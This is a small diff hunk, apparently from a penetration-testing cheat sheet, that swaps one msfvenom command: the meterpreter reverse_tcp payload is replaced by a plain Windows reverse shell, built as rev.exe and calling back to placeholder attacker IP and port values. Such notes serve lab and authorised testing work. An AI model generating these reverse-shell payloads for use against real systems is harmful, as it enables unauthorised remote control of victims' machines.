@@ -25,7 +25,7 @@ C:\Program Files (x86)
 msfvenom
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
+msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
 ```
 
 Exploits
